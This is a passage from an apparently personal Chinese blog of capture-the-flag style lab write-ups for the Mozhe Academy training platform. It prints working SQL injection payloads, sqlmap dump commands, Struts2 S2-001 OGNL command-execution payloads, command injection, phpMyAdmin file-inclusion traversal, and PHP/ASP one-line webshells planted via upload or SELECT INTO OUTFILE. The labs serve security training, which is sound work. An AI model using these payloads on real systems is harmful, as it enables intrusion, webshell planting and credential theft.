&quot;stormgroup&quot; limit 1,1),5,1))=99</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),6,1))=101</span><br><span class="line">new_list.php?id=1 and substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),1) = &#x27;notice&#x27;</span><br><span class="line">#查看member表有多少字段			#3</span><br><span class="line">new_list.php?id=1 and (select count(column_name) from information_schema.columns where table_name=&#x27;member&#x27;)=3</span><br><span class="line">#分别查看3个字段的长度	4	8</span><br><span class="line">new_list.php?id=1 and length(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),1))=4</span><br><span class="line">new_list.php?id=1 and length(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 1,1),1))=8</span><br><span class="line">#第一个字段	name</span><br><span class="line">new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),1,1))=110</span><br><span class="line">new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),2,1))=97</span><br><span class="line">new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),3,1))=109</span><br><span class="line">new_list.php?id=1 and substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),1)=&#x27;name&#x27;</span><br><span class="line">#第二个字段	password</span><br><span class="line">new_list.php?id=1 and substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 1,1),1)=&#x27;password&#x27;</span><br><span class="line">#查name有几行		2</span><br><span class="line">new_list.php?id=1 and (select count(name) from stormgroup.member)=2</span><br><span class="line">#查第一个用户</span><br><span class="line">#name 5个字母	password</span><br><span class="line">new_list.php?id=1 and length(substr((select name from stormgroup.member limit 0,1),1))=5</span><br><span class="line">new_list.php?id=1 and length(substr((select password from stormgroup.member limit 0,1),1))=32</span><br><span class="line">#猜是mozhe</span><br><span class="line">new_list.php?id=1 and substr((select name from stormgroup.member limit 0,1),1)=&#x27;mozhe&#x27;</span><br><span class="line">#麻了		以下有sqlmap用法</span><br><span class="line">//https://blog.csdn.net/m0_60945802/article/details/123636747</span><br><span class="line">--查数据库	这一步很多有y/n</span><br><span class="line">sqlmap -u http://124.70.71.251:47396/new_list.php?id=1 --dbs</span><br><span class="line">--查表名</span><br><span class="line">sqlmap -u http://124.70.71.251:47396/new_list.php?id=1 -D stormgroup --tables</span><br><span class="line">--查字段</span><br><span class="line">sqlmap -u http://124.70.71.251:47396/new_list.php?id=1 -D stormgroup -T member --columns —batch</span><br><span class="line">--</span><br><span class="line">sqlmap -u http://124.70.71.251:47396/new_list.php?id=1 -D stormgroup -T member -C name,password --dump</span><br><span class="line">参数参考https://www.csdn.net/tags/OtTaAgxsMjMxMzYtYmxvZwO0O0OO0O0O.html</span><br><span class="line">-batch	</span><br><span class="line">--dump	获取整个表的数据</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入漏洞测试-HTTP头注入"><a href="#SQL注入漏洞测试-HTTP头注入" class="headerlink" title="SQL注入漏洞测试(HTTP头注入)"></a>SQL注入漏洞测试(HTTP头注入)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前端知道后端搞了个X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>作为注入点</span><br><span class="line">#说明有<span class="number">4</span>个回显</span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line">#<span class="number">1</span>被吞了，其它在页面可以显示</span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654777777367.png" alt="1654777777367"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--数据库名pentesterlab</span></span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database(), <span class="number">3</span>, <span class="number">4</span></span><br><span class="line"><span class="comment">--数据表名comment，flag，goods，user</span></span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(table_name), <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pentesterlab&#x27;</span></span><br><span class="line"><span class="comment">--flag表的column名	id flag</span></span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(column_name), <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="comment">--flag值</span></span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(flag), <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> pentesterlab.flag</span><br></pre></td></tr></table></figure>

<h3 id="SQL过滤字符后手工注入漏洞测试-第1题"><a href="#SQL过滤字符后手工注入漏洞测试-第1题" class="headerlink" title="SQL过滤字符后手工注入漏洞测试(第1题)"></a>SQL过滤字符后手工注入漏洞测试(第1题)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--寻找注入点，根据提示16进制url编码，注释符</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654829272476.png" alt="1654829272476"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>m0_67399862<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">124970489</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654845576925.png" alt="1654845576925"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--=空格被过滤分别用like /**/代替，然后整个转16进制url</span></span><br><span class="line"><span class="comment">--正常</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">1</span></span><br><span class="line"><span class="comment">--异常</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span></span><br><span class="line"><span class="comment">--4个回显</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">4</span></span><br><span class="line"><span class="comment">--6,7位置可以显示，这里注意union前面没有and</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span></span><br><span class="line"><span class="comment">--数据库名		mozhe_discuz_stormgroup</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,database(),<span class="number">7</span>,<span class="number">8</span></span><br><span class="line"><span class="comment">--表名		notice,stormgroup_member</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,group_concat(table_name),<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span>database()</span><br><span class="line"><span class="comment">--列名		id,name,password,status</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,group_concat(column_name),<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="string">&#x27;stormgroup_member&#x27;</span></span><br><span class="line"><span class="comment">--查name，password</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,group_concat(name),group_concat(password),<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mozhe_discuz_stormgroup.stormgroup_member</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">mozhe,mozhe,admin</span></span><br><span class="line"><span class="comment">356f589a7df439f6f744ff19bb8092c0,a6babd9eb561e9ffd6f5aad28851daa7,e70be84907793e52f974a062e2bfcd4d</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">dsan13</span><br><span class="line">nothere</span><br><span class="line"><span class="number">548427</span></span><br></pre></td></tr></table></figure>



<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="WebShell文件上传漏洞分析溯源-第1题"><a href="#WebShell文件上传漏洞分析溯源-第1题" class="headerlink" title="WebShell文件上传漏洞分析溯源(第1题)"></a>WebShell文件上传漏洞分析溯源(第1题)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上传文件两个注意点：php5后缀	post请求		然后连接中国蚁剑即可</span></span><br></pre></td></tr></table></figure>

<h3 id="WebShell文件上传漏洞分析溯源-第2题"><a href="#WebShell文件上传漏洞分析溯源-第2题" class="headerlink" title="WebShell文件上传漏洞分析溯源(第2题)"></a>WebShell文件上传漏洞分析溯源(第2题)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前端验证		edge不能直接改网页的javascript代码</span></span><br><span class="line"><span class="comment">//上传.jpg	bp改.cmd绕过</span></span><br><span class="line"><span class="comment">//解法2	edge设置搜索javascript禁用</span></span><br></pre></td></tr></table></figure>

<h3 id="内部文件上传系统漏洞分析溯源-墨者"><a href="#内部文件上传系统漏洞分析溯源-墨者" class="headerlink" title="内部文件上传系统漏洞分析溯源(墨者)"></a>内部文件上传系统漏洞分析溯源(墨者)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">后缀asp！！</span><br><span class="line">//参考</span><br><span class="line">https://blog.csdn.net/weixin_43072923/article/details/115512018</span><br><span class="line">IIS的漏洞，上传xxx.asp文件时，该文件以后的子文件都以asp文件来执行,修改为upload文件夹修改为hyy.asp</span><br><span class="line">//asp文件一句话木马</span><br><span class="line">&lt;% eval request(&quot;a&quot;) %&gt;</span><br><span class="line">request可以直接连接</span><br></pre></td></tr></table></figure>

<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Apache-Struts2远程代码执行漏洞-S2-004-复现"><a href="#Apache-Struts2远程代码执行漏洞-S2-004-复现" class="headerlink" title="Apache Struts2远程代码执行漏洞(S2-004)复现"></a>Apache Struts2远程代码执行漏洞(S2-004)复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struts框架遍历目录漏洞</span><br><span class="line">//参考</span><br><span class="line">https://blog.csdn.net/zr1213159840/article/details/122385059</span><br><span class="line">http://124.70.71.251:44122/struts/..%252f</span><br><span class="line">%25是%的ascii码</span><br><span class="line">%2f是/的</span><br></pre></td></tr></table></figure>

<h3 id="命令注入执行分析"><a href="#命令注入执行分析" class="headerlink" title="命令注入执行分析"></a>命令注入执行分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//前端验证bp绕过或者禁用javascript</span><br><span class="line">iipp = 127.0.0.1|ls</span><br><span class="line">iipp = 127.0.0.1|cat&lt;key_x.php  或者	iipp = 127.0.0.1|cat key_x.php</span><br><span class="line">关于前端的验证</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654693346739.png" alt="1654693346739"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">浏览器缓存地址：internet选项-&gt;设置可以看到</span><br><span class="line">C:\Users\hyy\AppData\Local\Microsoft\Windows\INetCache</span><br><span class="line"></span><br><span class="line">linux &lt; 用法参考https://blog.csdn.net/qq_42883292/article/details/107588117</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Bash漏洞分析溯源"><a href="#Bash漏洞分析溯源" class="headerlink" title="Bash漏洞分析溯源"></a>Bash漏洞分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#火狐浏览器about:config的general.useragent.override可以更改报文的useragent</span><br><span class="line">尝试抓包改UA，但是发现不行不知道为啥</span><br><span class="line">但是使用curl指令可以</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1656651451933.png" alt="1656651451933"></p>
<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1656653253106.png" alt="1656653253106"></p>
<h3 id="Apache-Struts2远程代码执行漏洞-S2-001-复现"><a href="#Apache-Struts2远程代码执行漏洞-S2-001-复现" class="headerlink" title="Apache Struts2远程代码执行漏洞(S2-001)复现"></a>Apache Struts2远程代码执行漏洞(S2-001)复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">漏洞文档参考https://cwiki.apache.org/confluence/display/WW/S2-001</span><br><span class="line">参考https://blog.csdn.net/m0_58606546/article/details/122488427</span><br><span class="line">%&#123;1+2&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ls&quot;,&quot;/&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]</span><br><span class="line"></span><br><span class="line">&#123;&quot;cat&quot;,&quot;/key.txt&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>



<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="表单暴力破解实训-第1题"><a href="#表单暴力破解实训-第1题" class="headerlink" title="表单暴力破解实训(第1题)"></a>表单暴力破解实训(第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">too simple</span><br></pre></td></tr></table></figure>

<h2 id="CMS漏洞"><a href="#CMS漏洞" class="headerlink" title="CMS漏洞"></a>CMS漏洞</h2><h3 id="BeesCMS系统漏洞分析溯源"><a href="#BeesCMS系统漏洞分析溯源" class="headerlink" title="BeesCMS系统漏洞分析溯源"></a>BeesCMS系统漏洞分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先使用御剑扫描目录，得到后台登陆地址</span><br><span class="line"></span><br><span class="line">参考https://blog.csdn.net/asd158923328/article/details/99935925</span><br><span class="line">抓包知验证码为后端验证</span><br><span class="line">用户名输入	&#x27; or 1=1	得</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654788591129.png" alt="1654788591129"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">得：	<span class="number">5</span>个回显	等号被过滤了</span><br><span class="line"><span class="comment">--发现 union select都被过滤了</span></span><br><span class="line"><span class="string">&#x27; or union select 1,2,3,4,5#</span></span><br><span class="line"><span class="string">--select可以双写绕过</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> uniounionn selecselectt <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>#</span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; or unio union n selecselectt 1,2,3,4,5#</span></span><br><span class="line"><span class="string">未完</span></span><br></pre></td></tr></table></figure>

<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="PHP本地包含漏洞代码溯源"><a href="#PHP本地包含漏洞代码溯源" class="headerlink" title="PHP本地包含漏洞代码溯源"></a>PHP本地包含漏洞代码溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据提示：	http://124.70.71.251:46125/r.php?p=/the_key_is_here</span><br></pre></td></tr></table></figure>

<h3 id="phpMyAdmin后台文件包含分析溯源"><a href="#phpMyAdmin后台文件包含分析溯源" class="headerlink" title="phpMyAdmin后台文件包含分析溯源"></a>phpMyAdmin后台文件包含分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">实施流程参考https://blog.csdn.net/qq_40554015/article/details/121297782#commentBox</span><br><span class="line">首先弱口令爆破进后台，执行select &#x27;&lt;?php phpinfo();?&gt;&#x27;会写入到session文件中</span><br><span class="line">然后http://124.70.71.251:42175/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_q76ker8iqgqak6ed24e5iprtj6lkoe9h</span><br><span class="line">最后面是phpmyadmin的cookie值</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1656672695310.png" alt="1656672695310"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">_SERVER[&#x27;SCRIPT_FILENAME&#x27;]或者_SERVER[&#x27;DOCUMENT_ROOT&#x27;]的绝对路径</span><br><span class="line">这里有两种方法</span><br><span class="line">常用的路径总结：MySQL数据库安装目录（/var/lib/mysql）,web站点默认目录（/var/www/html/）</span><br><span class="line">1.sql写入一句话木马</span><br><span class="line">一些相关命令</span><br><span class="line">show variables like &#x27;general_log&#x27;; -- 查看日志是否开启</span><br><span class="line">set global general_log=on; -- 开启日志功能</span><br><span class="line">show variables like &#x27;general_log_file&#x27;; -- 看看日志文件保存位置</span><br><span class="line">set global general_log_file=&#x27;tmp/general.lg&#x27;; -- 设置日志文件保存位置</span><br><span class="line">show variables like &#x27;log_output&#x27;; -- 看看日志输出类型 table或file</span><br><span class="line">set global log_output=&#x27;table&#x27;; -- 设置输出类型为 table</span><br><span class="line">set global log_output=&#x27;file&#x27;; -- 设置输出类型为file</span><br><span class="line">用sql植入一句话木马，select &#x27;&lt;?php @eval($_POST[flag]);?&gt;&#x27; into outfile &#x27;/var/www/html/hack.php&#x27;</span><br><span class="line">蚁剑连接即可</span><br><span class="line">2.文件包含的方法</span><br><span class="line">这个链接是CVE-2018-12613 PhpMyadmin后台文件包含分析</span><br><span class="line">参考https://www.likecs.com/show-204906016.html</span><br><span class="line"></span><br><span class="line">首先index.php中判断4个与才会被包含，第四个与在ip/libraries/classes/Core.php的443行开始那个函数，第一个true出不来</span><br><span class="line">第二个true是取出?前面内容后做判断，是下面的路径http://124.70.71.251:46673/index.php?target=db_datadict.php?%20../../../../../key.txt</span><br><span class="line">如果从第三个true是先对原始page做urldecode再取出?前面内容做判断</span><br><span class="line">http://124.70.71.251:46673/index.php?target=db_datadict.php%253f%20../../../../../key.txt</span><br><span class="line">写了如下叫本验证，notice不用管他</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1656693781113.png" alt="1656693781113"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php中include的是php接受的target即</span><br><span class="line">target=db_datadict.php? ../../../../../key.txt或者</span><br><span class="line">target=db_datadict.php%3f ../../../../../key.txt target</span><br><span class="line">也就是说这两者都可以解析到 /key.txt不太明白。有一个说法是</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1656694004093.png" alt="1656694004093"></p>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="SVN信息泄露漏洞分析-第1题"><a href="#SVN信息泄露漏洞分析-第1题" class="headerlink" title="SVN信息泄露漏洞分析(第1题)"></a>SVN信息泄露漏洞分析(第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/90ac632e7134</span><br><span class="line">	SVN（subversion）是源代码版本管理软件。在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构</span><br><span class="line">	svn1.6版本之前		/.svn/entrist</span><br><span class="line">	svn1.7之后		/.svn/wc.db</span><br><span class="line">使用sqlitestudio打开</span><br></pre></td></tr></table></figure>



<h1 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h1><h3 id="HTTP动作练习"><a href="#HTTP动作练习" class="headerlink" title="HTTP动作练习"></a>HTTP动作练习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抓包右键change request method			get自动转post		注意改在哪里</span><br></pre></td></tr></table></figure>

<h3 id="浏览器信息伪造"><a href="#浏览器信息伪造" class="headerlink" title="浏览器信息伪造"></a>浏览器信息伪造</h3><p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654154126322.png" alt="1654154126322"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NetType:2G</span><br></pre></td></tr></table></figure>

<h3 id="投票常见漏洞分析溯源"><a href="#投票常见漏洞分析溯源" class="headerlink" title="投票常见漏洞分析溯源"></a>投票常见漏洞分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抓包send to intruder,然后改useragent加上X-Forward-For</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654575442812.png" alt="1654575442812"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload中payload type改numbers，payload option 1-255step1，这么会发送X-Forward-X从10.1.1.1-10.1.255.1以及10.1.0.1-10.1.0.255</span><br><span class="line"></span><br><span class="line">关于useragent</span><br><span class="line">//https://baijiahao.baidu.com/s?id=1695943965001485777&amp;wfr=spider&amp;for=pc</span><br><span class="line">本机edge的UA：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33</span><br><span class="line">https://baijiahao.baidu.com/s?id=1695943965001485777&amp;wfr=spider&amp;for=pc</span><br><span class="line">本机chrome的UA：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36</span><br><span class="line"></span><br><span class="line">关于X-Forward-X</span><br><span class="line">用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字</span><br></pre></td></tr></table></figure>

<h3 id="WEB页面源代码查看"><a href="#WEB页面源代码查看" class="headerlink" title="WEB页面源代码查看"></a>WEB页面源代码查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key在右键检查里面</span><br><span class="line">chrome快捷键f12</span><br><span class="line">edge不知道</span><br></pre></td></tr></table></figure>

<h3 id="HTML前端代码分析-暗链"><a href="#HTML前端代码分析-暗链" class="headerlink" title="HTML前端代码分析(暗链)"></a>HTML前端代码分析(暗链)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">右键检查或者view-source查看网页源码</span><br><span class="line">检索href发现一个内网链接</span><br><span class="line">将php文件加到公网后面查看源码</span><br></pre></td></tr></table></figure>

